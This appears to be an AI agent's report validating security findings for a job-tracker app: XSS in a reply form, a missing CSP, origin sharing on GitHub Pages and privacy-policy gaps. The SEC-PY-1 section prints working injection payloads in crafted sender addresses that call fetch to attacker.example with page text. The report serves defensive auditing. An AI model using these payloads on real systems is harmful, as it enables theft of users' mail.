# Skeptic validation: security-python.md, bestpractices-python.md, security-web.md

Repo /Users/thorn.leung/job-tracker, branch easy-connect, tree clean (only untracked `.claude/` and `.coverage`, both pre-existing). Nothing in the repo was edited. Scratch scripts are in /private/tmp/claude-502/-Users-thorn-leung/c9e35028-bd31-40d3-a1cd-3f723d21e55b/scratchpad/validate/ (sec1.py, sec23.py, bp1.py, bp1.cjs, bp2.py, bp4.py, secweb3/*.test.ts, pytest-short.txt).

Summary

| id | verdict | severity (report -> mine) |
|---|---|---|
| SEC-PY-1 | CONFIRMED | High -> Medium |
| SEC-PY-2 | PARTLY CONFIRMED | Medium -> Low |
| SEC-PY-3 | CONFIRMED (facts) | Medium -> Low |
| BP-PY-1 | CONFIRMED, one claim overstated | Critical -> Medium |
| BP-PY-2 | CONFIRMED | Critical -> Low (Medium only if macOS/Linux is a supported dev platform) |
| BP-PY-3 | CONFIRMED, duplicate of SEC-PY-1 (+ SEC-PY-4) | Critical-ish -> Medium |
| BP-PY-4 | PARTLY CONFIRMED | Important -> Low/Medium |
| SEC-WEB-1 | CONFIRMED, and worse than reported (other Pages sites exist today) | Medium -> Medium (leaning High if balloons-by-tea keeps third-party scripts) |
| SEC-WEB-2 | CONFIRMED | Medium -> Low |
| SEC-WEB-3 | PARTLY CONFIRMED (Google yes, Microsoft no) | Low -> Low |

---

## SEC-PY-1: JS-string injection via sender address in `_reply.html` onsubmit

VERDICT: CONFIRMED. Severity: Medium (report said High).

Code, `jobtracker/templates/_reply.html:5-7`:
```html
{% if r_can and rp %}
<form method="post" action="/email/{{ r_id }}/reply" ... onsubmit="return confirm('Send this reply to {{ r_to }}?')">
```
`r_to = (e.sender|sender_addr)` at `detail.html:93`, `review.html:30`, `_panel.html:56`. `sender_addr` is `mailtext.split_sender(s)[1]` (`web.py:181`). Stored sender is `f"{msg.sender_name} <{msg.sender_email}>"` (`sync.py:100`), and Gmail fills `sender_email` from `email.utils.parseaddr(headers["from"])` (`providers/gmail.py:189`), Outlook from Graph `emailAddress.address` (`outlook.py:139`).

What `reply.recipient()` allows: `_ADDRESS = [^@\s<>]+@[^@\s<>]+\.[^@\s<>]+` (`links.py:24`), i.e. anything except whitespace, `@`, `<`, `>`. `'`, `(`, `)`, `"`, backtick, `$`, `{`, `}`, `+`, `-`, `;`, `\` all pass. `recipient()` and `reply_link()` both use it.

Replying enabled by default? No. `accounts.can_reply INTEGER NOT NULL DEFAULT 0` (`db.py:19`) and `upsert_account` resets it to 0 on reconnect (`db.py:231`). It is switched on only by the "Allow replying" button (`web.py:570`, after an OAuth sign-in that includes the send scope; SETUP.md:30 calls the gmail.send scope "Optional"). My reproduction confirms: with `can_reply=0` no "Send this reply" form is rendered; with `can_reply=1` it is.

Does Jinja autoescape stop it? No. Autoescape correctly HTML-escapes `'` to `&#39;`, but the browser HTML-decodes the attribute value before handing it to the JS engine, so the quote closes the JS string.

Reproduction (TestClient, real templates, sender stored exactly as `sync.py` stores it; sec1.py):
```
stored sender: ' <"x\'-fetch(`//attacker.example/?`+document.body.innerText)-\'"@attacker.example>'
RAW HTML: onsubmit="return confirm('Send this reply to &#34;x&#39;-fetch(`//attacker.example/?`+document.body.innerText)-&#39;&#34;@attacker.example?')">
browser-decoded handler JS: return confirm('Send this reply to "x'-fetch(`//attacker.example/?`+document.body.innerText)-'"@attacker.example?')
```
Executed that decoded handler in Node with stubbed `fetch`/`document`: `[["fetch","//attacker.example/?SECRET MAIL TEXT"],["confirm",null]]`, so the injected `fetch` runs.

Stronger than the report says: no quoting and no parentheses are needed. RFC 5322 `atext` includes `' ` $ { } - /`, so this unquoted address survives `parseaddr` and `_ADDRESS`:
```
From: Recruiter <x'-fetch`//attacker.example/?${document.body.innerText}`-'@attacker.example>
-> onsubmit="return confirm('Send this reply to x&#39;-fetch`//attacker.example/?${document.body.innerText}`-&#39;@attacker.example?')"
-> decoded JS runs fetch`...` (tagged template, no parentheses)   [Node run of the decoded handler: fetch called with ["//attacker.example/?", ""]]
```
Nuance on BP-PY-3's example `x'+alert(1)+'@e.vil`: on the Gmail path `parseaddr` treats `(1)` as a comment and returns `x'+alert+'@e.vil` (harmless), so that exact string only works on the Outlook path (no parseaddr; `recipient("X <x'+alert(1)+'@e.vil>")` returns it unchanged) or in quoted/backtick form for Gmail.

Not verifiable here: whether Gmail's or Exchange's inbound pipeline delivers a header/address with these characters unchanged. The app side is fully proven; the mail-transport side is an assumption (the report says the attacker controls their own mail server, which is plausible but untested).

Why Medium and not High: needs (1) the opt-in replying feature on for that account, (2) the attacker mail classified as related (a "thanks for applying" body does it) and shown as a reply form, (3) the user opens Reply, types a body (`textarea required`, so the submit event only fires after validation) and presses Send. A recruiter-style email asking "reply with your availability" is natural bait, so (3) is not far-fetched. Impact once it fires is high: same-origin script with no CSP can read all pages (mail, notes, resume), exfiltrate with `fetch`, or even use the app's own reply endpoint to mail data to the attacker (the attacker's address is the stored sender; body cap 5000, 10 per hour), delete data, replace the Google client file (SEC-PY-6).

Minimal fix (also fixes `_person.html:27`, SEC-PY-4):
1. `<form ... data-confirm="Send this reply to {{ r_to }}?">` and one delegated listener in `base.html`: `document.addEventListener('submit', e => { const m = e.target.dataset && e.target.dataset.confirm; if (m && !confirm(m)) e.preventDefault(); });` (attribute escaping is the right escaping there; I rendered it: `data-confirm="Send this reply to &#34;x&#39;-...@attacker.example?"`).
2. If the inline handler must stay: `onsubmit="return confirm({{ ('Send this reply to ' ~ r_to ~ '?')|tojson|forceescape }})"`. I rendered this and it is correct: decoded JS is `return confirm("Send this reply to \"x'-fetch(...)-'\"@attacker.example?")`. Note that `|tojson` alone is NOT enough: Jinja's tojson leaves `"` raw and breaks out of the attribute (rendered: `onsubmit="return confirm("Send this reply to ...`), so `|forceescape` is required, as the report says.

---

## SEC-PY-2: no authentication on the local server

VERDICT: PARTLY CONFIRMED (facts true, severity overstated). Severity: Low (report Medium).

Facts reproduced (sec23.py, TestClient, no Origin / Sec-Fetch-Site / cookie, i.e. what curl or any local program sends):
```
GET /app/1 no headers:            200, stored email body present: True
POST /email/1/reply no Origin/SFS: 303 -> /app/1?reply_error=The reply wasn't sent: module 'ctypes' has no attribute 'windll'
   (it passed the guard and reached the provider call; failed only because macOS has no DPAPI)
GET with Host: evil.example:       403        POST with Origin: http://evil.example: 403
POST with Sec-Fetch-Site: cross-site: 403     static file with wrong Host: 403
CORS header on cross-origin GET:   None
```
`web.py:183-203`: the guard checks `request.url.hostname in LOCAL_HOSTS` and, for POST only, `Origin` equality and `Sec-Fetch-Site`. A request that omits those headers (every non-browser client) passes everything. So the guard covers browsers (CSRF, DNS rebinding) and nothing else; its own comment says exactly that. `cli.py:111` binds `127.0.0.1` only; port 8765 is the documented default.

Why Low: the realistic non-browser caller is a process running as the same Windows user, and that process can already read `data/*.db` and decrypt the DPAPI token files (DPAPI is tied to the user, not the process), so the missing login gives it nothing it could not already do. The only party who gains is a different OS user on a shared or terminal-server machine (loopback ports are visible across accounts while the files are not), which is outside the app's documented single-user desktop model. A browser extension already has more access than the web server gives it.

Minimal fix: document the single-user assumption in SETUP.md; if a shared machine matters, a per-launch random token in an HttpOnly SameSite=Strict cookie set from a one-time `/?k=` URL, as the report proposes.

---

## SEC-PY-3: no CSP, no framing protection

VERDICT: CONFIRMED (facts). Severity: Low (report Medium).

Evidence: `grep -rn "X-Frame\|frame-ancestors\|Content-Security\|Referrer-Policy\|nosniff" jobtracker/` returns nothing, and the response headers of `GET /app/1` are only `content-length` and `content-type` (sec23.py output above). The middleware sets only the profile cookie.

Why Low: clickjacking needs a malicious page to frame `http://127.0.0.1:8765` while the dashboard runs, and the user to click through. The destructive forms (`detail.html:47-49` delete, not-an-application, `_person.html:27`) have `confirm()` dialogs, which are native and still appear when framed. "Allow replying" only starts an OAuth window where Google still asks for consent. The `jt_profile` cookie is `SameSite=Lax`, so it is not sent in a cross-site frame (the framed app would use the default profile). Modern Chrome also gates public-site to loopback requests behind a local-network prompt, though I did not test that. The "(b) a CSP would contain an injection" half is true and was demonstrated by SEC-PY-1: with no CSP the injected `fetch` goes out.

Minimal fix (cheap, do it with SEC-PY-1): in the existing `local_only` middleware add `response.headers["X-Frame-Options"] = "DENY"` and `"Content-Security-Policy": "frame-ancestors 'none'; base-uri 'none'; form-action 'self'"`. A script-src CSP needs the inline `<script>` blocks moved out (BP-PY-13), so it is a later step; `connect-src 'self'` alone would already stop the exfiltration in SEC-PY-1.

---

## BP-PY-1: `<script>` inside `{% block title %}` in detail.html

VERDICT: CONFIRMED, with one claim overstated. Severity: Medium (report Critical).

Code, `jobtracker/templates/detail.html:2-13`: `{% block title %}{{ a.company }} · Job Tracker<script> ... </script>{% endblock %}`; `base.html:9`: `<title>{% block title %}Job Tracker{% endblock %}</title>`. Only `detail.html` has this (`grep "block title"` finds no other block that does not end on its own line).

Reproduction (bp1.py renders `GET /app/1` and `GET /contacts`; bp1.cjs parses them with jsdom/parse5, a spec-compliant HTML5 parser):
```
/app/1   <title>Acme · Job Tracker<script>\n  // Arriving from a person's "Reply here" ... })();\n</script>\n</title>   (535 chars)
         jsdom document.title = "Acme · Job Tracker<script> // Arriving from a person's \"Reply here\" or ..." (497 chars)
         <script> elements inside <title>: 0 ; 'scrollIntoView' appears once in the document, as title text
/contacts <title>People · Job Tracker</title>   jsdom document.title = "People · Job Tracker" (20 chars)
```
`<title>` is RCDATA, so the script is text: the tab title on every application page is "Acme · Job Tracker<script> // Arriving from..." and the script never runs.

What is lost, corrected: the report says "the code that scrolls to #email-N ... never executes" and "lands at the top of the page". The scroll half is wrong: the cards have `id="email-{{ e.id }}"` in the server-rendered HTML (`detail.html:85`), so the browser's native fragment navigation still scrolls to `#email-N`. What really is lost is the `box.open = true` line: "Reply here" (`_person.html:8`, `/app/{id}?reply=1#email-{id}`) no longer opens the reply form (and `scrollIntoView({block:'start'})` is redundant with native behaviour). So: garbage tab title on every detail page (visible to the user), plus one dead convenience feature. That is Medium, not Critical.

contacts.html: confirmed already fixed at HEAD. `git show HEAD:jobtracker/templates/contacts.html` starts `{% block title %}People · Job Tracker{% endblock %}`, and its script (`contacts.html:45-49`, expand/collapse) sits inside `{% block content %}`; the rendered title above is clean and 2 script elements are parsed.

Minimal fix: `{% block title %}{{ a.company }} · Job Tracker{% endblock %}` and move the `<script>...</script>` to the end of `{% block content %}` (as contacts.html does). A test: `<title>` text contains no `<`.

---

## BP-PY-2: `GET /jobs` is 500 off Windows; 7 failures share one root cause

VERDICT: CONFIRMED. Severity: Low for users (the app is Windows-only by design), Medium for repo hygiene if macOS/Linux dev is intended. Report said Critical, which is too high.

Code: `providers/base.py:50-57` `token_persistence()` imports and builds `msal_extensions.FilePersistenceWithDataProtection` unconditionally; `jobs/adzuna.py:24-29` `load_credentials` catches only `(FileNotFoundError, ValueError, OSError)`; `jobs_web.py:72` calls it on every Jobs render; `jobs/run.py:50` calls it outside any `try` although the function is documented never to raise.

Reproduction (bp2.py, TestClient with `raise_server_exceptions=False`, sys.platform darwin):
```
/ 200   /settings 200   /flow 200   /contacts 200   /review 200   /jobs 500
```
Full suite: `7 failed, 877 passed`. Each traceback read (pytest-short.txt); every one ends
`jobtracker/providers/base.py:57 token_persistence` -> `msal_extensions/windows.py:5: AttributeError: module 'ctypes' has no attribute 'windll'`, via `adzuna.load_credentials` (adzuna.py:26):

| test | path to the failure |
|---|---|
| test_contacts.py::test_the_current_page_is_marked_in_the_navigation[/jobs-/jobs] | GET /jobs -> jobs_web.py:72 jobs_page |
| test_jobs_core.py::test_discovery_reads_feeds_notifies_and_records_errors | jobs/run.py:50 run_discovery |
| test_jobs_core.py::test_feeds_checked_recently_are_skipped_unless_forced | run.py:50 |
| test_profiles.py::test_a_link_with_profile_opens_that_profile_and_remembers_it | GET /jobs -> jobs_page (jobs_web.py:72) |
| test_profiles.py::test_pop_up_names_the_profile_and_opens_it_when_there_are_several | jobs_web.py:98 refresh -> run.py:50 |
| test_reply.py::test_every_page_localises_times_once_in_the_shared_script | GET /jobs -> jobs_page |
| test_third_review.py::test_a_broken_company_source_is_recorded_not_raised | run.py:50 |

So the "7 expected failures" are one root cause, not seven, and not all of them are "Windows-only by nature": several (e.g. the nav-highlight and "localises times" tests) only need `/jobs` to render, so they fail because of the unguarded DPAPI call, not because they test DPAPI.

Minimal fix: let `token_persistence` raise one dedicated error (`except (ImportError, AttributeError, NotImplementedError)`), and have `adzuna.load_credentials`/`clear_credentials` treat it as "no credentials" (return None / pass), `save_adzuna` flash the message. Alternatively mark the 7 tests `skipif(sys.platform != "win32")`.

---

## BP-PY-3: Jinja values in inline JS strings

VERDICT: CONFIRMED, and it is the same bug as SEC-PY-1 (identical sink, `_reply.html:7`) plus the SEC-PY-4 sink (`_person.html:27`, `{{ c.name }}`). It should be one ticket, not two. The other `onsubmit` confirms are static text (`detail.html:47-49`) or an internal enum (`_panel.html:78`, `{{ i.kind }}`): confirmed by grep of every `onsubmit=`/`onclick=`/`onchange=` that contains `{{`: only `_reply.html:7`, `_panel.html:78`, `_person.html:27`. See SEC-PY-1 for evidence, the nuance that the example string `x'+alert(1)+'@e.vil` is mangled by `parseaddr` on the Gmail path but survives the Outlook path (my `reply.recipient("X <x'+alert(1)+'@e.vil>")` returned the address unchanged), and for the fix. Severity Medium, same reasoning.

---

## BP-PY-4: broad `except Exception` in `process_messages`

VERDICT: PARTLY CONFIRMED. Severity: Low/Medium (report "Important").

Code path, `sync.py:212-232`: `sqlite3.OperationalError` -> result "retry", nothing stored, refetched next sync (and `sync_account` keeps the old window start, `sync.py:181-186`). Any other exception -> `_remember_unrelated` inserts `(account_id, provider_msg_id, received_at, related=0)`, and `db.email_seen` (`db.py:240`) then reports it as seen, so it is never fetched or processed again.

Reproduction (bp4.py, classifier patched to raise `ValueError`, DEBUG logging on):
```
sync 1 (bug): {'error': 1}
rows: [{'provider_msg_id': 'm1', 'related': 0, 'sender': None, 'subject': None, 'body': None, 'application_id': None}]
sync 2 (bug fixed, same message refetched): {'duplicate': 1}
applications: 0
sync (locked): {'retry': 1}   m2 rows: 0     (OperationalError is retried, as claimed)
```
No log line was emitted at any level; `getLogger` exists only in `gmail.py`, `outlook.py`, `reply.py` (grep). The only trace is `accounts.last_error = "Skipped N unreadable message(s)"`, overwritten by the next successful sync (`sync.py:179-195`).

What the report gets right: a message that fails for a non-database reason is discarded permanently with no traceback anywhere, and recovery needs manual SQL. What it overstates: the "permanent mark as seen" is deliberate and pinned by tests (`test_second_review.py:46 test_an_unreadable_message_is_still_marked_seen`, `test_fourth_review.py:157` asserts `email_seen` for the permanent error and not for the retry), with the comment "would fail every time", to avoid an endless failure loop. The report itself says the catch is defensible; the defect is the missing `log.exception`. Also, because `process_message` does its writes inside one `with conn:`, a failing message rolls back (no half-created application), which I confirmed (`applications: 0`).

Minimal fix: `log = logging.getLogger(__name__)` in `sync.py` and `log.exception("Couldn't process message %s", msg.id)` in that handler (and the `except sqlite3.Error: pass` next to it); optionally keep the last error text in `accounts.last_error`. Do not change the mark-as-seen behaviour without changing those tests.

---

## SEC-WEB-1: hosted app shares the github.io origin with other Pages sites

VERDICT: CONFIRMED, and the precondition ("any other Pages site of the same account") is already true today. Severity: Medium as stated; I would raise it toward High if the sibling sites run third-party or user-influenced script.

Code:
- `web/vite.config.ts:6` `base: "/job-tracker/"`; the doc comment says it is served from `https://thornleung01.github.io/job-tracker/`. No `CNAME` in `web/public` (only `favicon.svg`, `privacy.html`).
- `web/src/auth/user.ts:21-23` `dbNameFor` = `jobtracker:${iss}:${sub}`; Dexie DBs are origin-scoped, not path-scoped.
- `web/src/pages/setup/steps.ts:4,15` tells the owner to register `origin` (no path) as the Google "Authorized JavaScript origin"; Microsoft gets `origin + baseUrl` as the SPA redirect URI.
- `web/src/auth/google.ts:157-165` GIS `initTokenClient({client_id, scope})` has no path binding.

Evidence that other sites exist (read-only `gh api users/thornleung01/repos`): `balloons-by-tea` (has_pages true, legacy build from main, `https://thornleung01.github.io/balloons-by-tea/`), `job-tracker-info` (has_pages true; two static pages), `job-tracker`. `balloons-by-tea` has an `admin.html`, `analytics.js`, `order-source.js`, `supabase-config.js` and loads `cdn.jsdelivr.net/.../supabase.min.js` (with SRI) in `index.html`. I did not audit it for XSS, only noted it is a dynamic site with third-party scripts on the same origin.

What a script on that origin can do, given how the app works:
1. Read and write the data: `indexedDB.databases()` enumerates the names (no need to know the sub), then it can open `jobtracker:https://accounts.google.com:<sub>` and read stored email excerpts (sender, subject, up to 4,096 chars of body), applications, notes, contacts; and modify or delete them. Nothing is encrypted at rest.
2. Mint Gmail tokens: Google validates origin only, so `google.accounts.oauth2.initTokenClient({client_id: <the app's public client id>, scope: gmail.readonly})` works from that origin; for a user who has already consented, Google's documented `prompt: 'none'` returns a token without UI (documented behaviour, not tested here; popup/user-gesture rules may add friction).
3. Cannot: read the app's in-memory tokens (module memory, MSAL `memoryStorage`, `web/src/auth/microsoft.ts:43`), nor Microsoft tokens (exact-path redirect URI), nor replace the app's JS (a service worker from another path cannot take scope over `/job-tracker/`; Pages sends no `Service-Worker-Allowed`). localStorage holds only the last-provider hint.

Realistic mitigation (a CSP cannot help):
1. Best: give the app its own origin: a custom domain (add `web/public/CNAME` and DNS, update the Google "Authorized JavaScript origin" and the Microsoft redirect URI), or a dedicated GitHub org/user used only for it.
2. Cheaper interim: move `balloons-by-tea` (and `job-tracker-info`) to another account or domain so the origin hosts only this app; at minimum document in `web/README.md` and the setup guide that the account must host no other Pages sites.
3. Optionally, since the data is local, a "keep data only while signed in" mode (wipe/encrypt IndexedDB on sign-out) reduces what a hostile same-origin script can read.

---

## SEC-WEB-2: privacy page vs the `gh_jid` heuristic

VERDICT: CONFIRMED. Severity: Low (report Medium): the disclosure is tiny and user-initiated, but it is a factual contradiction in a privacy policy, so fix it before any Google OAuth verification.

Privacy sentence, `web/public/privacy.html:83`:
> "When you paste a job link from Greenhouse, Lever, Ashby or SmartRecruiters, your browser asks that job board's public API for the job's title, company and location. The request contains only the board name and job number from the link, and it goes straight from your browser to the job board. Links from any other site are read on your device only, with no request."

Code, `web/src/jobs/url.ts:247-252` (in `detectBoard`):
```ts
// A company career page that embeds Greenhouse: the board slug is usually the company's own name.
const jid = u.searchParams.get("gh_jid");
if (jid && /^\d{1,20}$/.test(jid)) {
  const { label } = registrable(host);
  if (!NOT_A_BOARD_LABEL.has(label)) return ok("greenhouse", label, jid);
}
```
`enrichJobDraft` (`enrich.ts:276-286`) calls `detectBoard(draft.url)` and `LOOKUPS[ref.board]`; `useJobLink.ts:124` runs it on paste.

Reproduction (secweb3/ghjid.test.ts, vitest with a recording fetch):
```
https://careers.acme.com/open-role?gh_jid=123456 -> [ 'https://boards-api.greenhouse.io/v1/boards/acme/jobs/123456' ]
https://example.com/careers/analyst              -> no request
```
So a link from "any other site" does cause a request, and the "board name" is a guess taken from the employer's domain. Small correction: in my run a 404 on the job call produced one request, not two (the report mentioned a second `/boards/<label>` call for the company name, which only happens after the first succeeds).

Minimal fix: add one sentence to privacy.html:83 ("Some company career pages that use Greenhouse, recognised by `gh_jid` in the link, also send a request to Greenhouse with a name guessed from the site's domain and the job number."), or delete the `gh_jid` branch.

---

## SEC-WEB-3: silent token refresh not re-verified against the connected mailbox

VERDICT: PARTLY CONFIRMED. Google half is real in code; the Microsoft half is rejected. Severity: Low (agree).

Trace:
- `connected` map: `pages/settings/actions.ts:14-19`; written only in `registerMailbox` (`actions.ts:50`) which runs after a fresh connect / post-login pending sync. `forgetConnections()` is referenced only in tests (grep: `tests/settings/*`, `tests/components/syncbanner/*`), never on sign-out. Confirmed.
- Silent refresh: `auth/index.ts:174-183` `acquire()` -> for Gmail `google.requestMailToken({signal, loginHint: user.email})` (`google.ts:224-255`), which calls `initTokenClient({prompt: "", login_hint})` and takes whatever token comes back; unlike `signIn`, there is no tokeninfo or address check. `tokenSource` (`index.ts:196-229`) stores it in `tokens` and `isConnected` (`actions.ts:58-60`) only compares the stored address from the earlier registration, so `runSync` proceeds. `syncAccount` uses `account.address` only as a label (`sync.ts:233-234`; no address comparison).
- Note `acquire(provider, false)` for Gmail ignores the `interactive` flag: the Google path can open a GIS window mid-sync, which is where a chooser could appear. Microsoft honours it.

Reproduction of the consequence (secweb3/refresh.test.ts, real `createAuth`, `registerMailbox`, `isConnected`, `runSync`, fake Google that returns a different mailbox's token on the post-expiry refresh):
```
token used for the sync: [ 'tokB' ] belongs to: [ 'someone-else@gmail.com' ]
refreshes: 1 | account row being synced: ada@gmail.com | needConnect: 0 failed: 0 synced: 1
stored emails: [ { accountId: 1, body: '... (this mail lives in someone-else@gmail.com)' } ]
```
So if Google ever hands back another mailbox's token, that mailbox's job mail is stored under the first account's row (and non-job mail is recorded as id+date there), with no error. What I could not verify is whether GIS does that: it needs the hinted session to be gone (account chooser) or the user to pick another account in the popup; I cannot test Google's behaviour. Impact stays confused data in the user's own browser, no disclosure to a third party, and mail links built from the account address (`authuser=`) would point to the wrong mailbox.

Microsoft half REJECTED: `microsoft.ts:166-178` `requestMailToken` first calls `acquireTokenSilent({scopes, account})` bound to the existing `account`, and the popup fallback (`popup()`, which may swap `account = r.account`) runs only when `interactive` is true; `tokenSource` calls `acquire(provider, false)`, so a sync can never switch the Microsoft account. The interactive path is `connectMail`, which `connectMailbox` always follows with `registerMailbox` (re-reads the real address via `getAddress` and updates `connected`), so it is re-verified there.

Minimal fix: in `tokenSource`/`acquire`, after any non-sign-in Google acquisition, call `getAddress` once and compare with `connectedAddress`; throw `NotConnected` on mismatch. Call `forgetConnections()` from the sign-out path.
